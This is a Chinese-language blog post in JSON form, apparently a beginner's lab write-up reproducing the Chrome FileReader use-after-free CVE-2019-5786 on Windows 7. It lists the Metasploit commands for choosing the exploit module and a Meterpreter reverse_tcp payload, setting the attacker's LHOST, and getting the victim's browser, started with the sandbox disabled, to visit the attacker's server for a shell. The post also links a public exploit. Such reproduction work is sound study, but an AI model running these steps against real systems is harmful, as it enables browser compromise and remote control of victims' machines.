{"title":"CVE-2019-5786","slug":"CVE-2019-5786","date":"2020-05-12","updated":"2020-09-10","comments":true,"path":"api/posts/23309.json","excerpt":null,"cover":"https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png","covers":["https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png","https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png","https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png","https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png"],"content":"<p>前言：</p>\n<p>这个漏洞是我第一个自己进行复现和尝试写 exp 的洞，我希望在未来我能够对于复现漏洞和写 exp 能像吃饭喝水一样自信！加油！</p>\n<h2 id=\"环境\"><a href=\"# 环境\" class=\"headerlink\" title=\"环境\"></a>环境</h2><p>kali<br>win7_x86<br>Google_chrome_(32bit)_v72.0.3626.119</p>\n<p>浏览下载链接推荐：<a href=\"https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe\" target=\"_blank\" rel=\"noopener\">https://dl.google.com/release2/chrome/AMavr_Q0teHn_72.0.3626.119/72.0.3626.119_chrome_installer.exe</a></p>\n<h2 id=\"复现：\"><a href=\"# 复现：\" class=\"headerlink\" title=\"复现：\"></a>复现：</h2><p>kali 启动 msf, 搜索 chrome_filereader 利用模块。(据谷歌官方公示，CVE-2019-5786 是位于 FileReader 中的 UAF 漏洞)</p>\n<p><code>root@kali:~# msfconsole -q</code></p>\n<p><code>msf5 &gt; search chrome_filereader</code></p>\n<blockquote>\n<p>注：<br>1.<code>msfconsole -q</code>  是指启动工具 msf，-q 不打印没用的东西出来（msf 启动界面）之后可能需要专门整理一下有关 msf 工具的知识。<br>2.<code>search chrome_filereader</code>正则匹配搜索 exp。exp 存在则浮现。<br>3. 什么是 UAF 漏洞：内存破坏漏洞，通常存在于浏览器中，详细可见博客文章“UAF 漏洞简单学习”</p>\n</blockquote>\n<p>出现 exp: <code>exploit/filereader/browser/chrome_filereader_uaf</code></p>\n<p><img src=\"https://i.loli.net/2020/05/25/IcHhEGVmKiTvxyz.png\" alt=\"捕获.PNG\"></p>\n<h3 id=\"简单了解 FileReader 对象的用法\"><a href=\"# 简单了解 FileReader 对象的用法\" class=\"headerlink\" title=\"简单了解 FileReader 对象的用法\"></a>简单了解 FileReader 对象的用法</h3><p>Filereader 可以实现对文件内容或者缓冲区数（Blob）的异步读取</p>\n<ul>\n<li><p>readyState：表示读取状态</p>\n<ul>\n<li>empty,0, 尚未读取</li>\n<li>loading,1, 正在读取</li>\n<li>done,2, 读取完成</li>\n</ul>\n</li>\n<li><p>result：表示读取结果，具体格式与读取方式有关：</p>\n<ul>\n<li>readAsArrayBuffer</li>\n<li>readAsBinaryString</li>\n<li>readAsDataURL</li>\n<li>readAsText</li>\n</ul>\n</li>\n<li><p>onprogress：回调函数</p>\n<ul>\n<li>读取 Blob 触发</li>\n<li>当数据较多时会周期性触发多次</li>\n</ul>\n</li>\n<li><p>onloadend：回调函数</p>\n<ul>\n<li>读取操作完成时触发，不论读取成功或失败</li>\n</ul>\n</li>\n</ul>\n<p>查看模块信息</p>\n<p><img src=\"https://i.loli.net/2020/05/25/dT2WQNsPg4qaBZH.png\" alt=\"捕获.PNG\"></p>\n<p>漏洞介绍：</p>\n<figure class=\"highlight plain\"><figcaption><span>information:</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Description:</span><br><span class=\"line\">  This exploit takes advantage of a use after free vulnerability in </span><br><span class=\"line\">  Google Chrome 72.0.3626.119 running on Windows 7 x86. The </span><br><span class=\"line\">  FileReader.readAsArrayBuffer function can return multiple references </span><br><span class=\"line\">  to the same ArrayBuffer object, which can be freed and overwritten </span><br><span class=\"line\">  with sprayed objects. The dangling ArrayBuffer reference can be used </span><br><span class=\"line\">  to access the sprayed objects, allowing arbitrary memory access from </span><br><span class=\"line\">  Javascript. This is used to write and execute shellcode in a </span><br><span class=\"line\">  WebAssembly object. The shellcode is executed within the Chrome </span><br><span class=\"line\">  sandbox, so you must explicitly disable the sandbox for the payload </span><br><span class=\"line\">  to be successful.</span><br></pre></td></tr></table></figure>\n\n<p>选择 payload<br><code>-&gt; set payload windows/meterpreter/reverse_tcp</code></p>\n<blockquote>\n<p>注：meterpreter/reverse_tcp：基于 TCP 的反向链接反弹 shell，详细见文章“初识 Meterpreter”</p>\n</blockquote>\n<p>设置 payload 参数：LHOST 为 kali ip<br><code>-&gt; set LHOST 192.168.119.128</code></p>\n<p><img src=\"https://i.loli.net/2020/05/25/chvQmOGL1Kqgebs.png\" alt=\"捕获.PNG\"></p>\n<p>创建服务 <code>-&gt; set payload windows/meterpreter/reverse_tcp</code></p>\n<p><img src=\"https://i.loli.net/2020/05/25/bNlUIHPxwkXcsrn.png\" alt=\"捕获.PNG\"></p>\n<p>启动服务：run 或者 exploit</p>\n<p>在 win7 下进入 chrome 文件目录，在目录下进去 cmd，并以沙箱关闭状态执行 chrome.exe<br><code>-&gt; chrome.exe --no-sandbox</code></p>\n<p>在弹出的 chome 浏览器中访问 kali ip:<br><a href=\"http://192.168.119.128:8080\" target=\"_blank\" rel=\"noopener\">http://192.168.119.128:8080</a></p>\n<p>kali 获得 sessions<br>查看 sessions 序号，通过反弹 shell 在 win7 上可执行命令。<br>复现结束。</p>\n<h3 id=\"后记\"><a href=\"# 后记\" class=\"headerlink\" title=\"后记\"></a>后记 </h3><p> 在获取 session 时候我遇见了很多小问题导致我不能获取，比如 win7 应该是 x86 系统，比如 win7 的防火墙忘记关闭了，比如网速太慢，在历经无数崩溃瞬间我成功的获取了 session.<br>虽然后来再整理 wp 的时候，win7 系统由于自动更新，chrome119 版本也升级了，后来再安装却死活安装不上去，差点升天……</p>\n<h3 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><p>exp 太长了并且看不懂，等我后面有机会再整理。这边放其他大佬整理出来的 exp。</p>\n<p><a href=\"https://github.com/exodusintel/CVE-2019-5786\" target=\"_blank\" rel=\"noopener\">https://github.com/exodusintel/CVE-2019-5786</a> </p>\n","url":"/posts/23309/","min2read":3,"word4post":760,"prev_post":{"title":"UAF 漏洞简单学习","url":"/posts/24311/"},"next_post":{"title":"攻防世界 guess_num","url":"/posts/52610/"},"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"环境\" href = \"#\"><span class=\"toc-number\">1.</span> <span class=\"toc-text\">环境</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" data-id=\"复现：\" href = \"#\"><span class=\"toc-number\">2.</span> <span class=\"toc-text\">复现：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"简单了解 FileReader 对象的用法\" href = \"#\"><span class=\"toc-number\">2.1.</span> <span class=\"toc-text\">简单了解 FileReader 对象的用法</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"后记\" href = \"#\"><span class=\"toc-number\">2.2.</span> <span class=\"toc-text\">后记 </span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" data-id=\"EXP\" href = \"#\"><span class=\"toc-number\">2.3.</span> <span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","categories":[],"tags":[{"name":"chrome_bug","path":"api/tags/chrome_bug.json","url":"/tags/chrome-bug/"}]}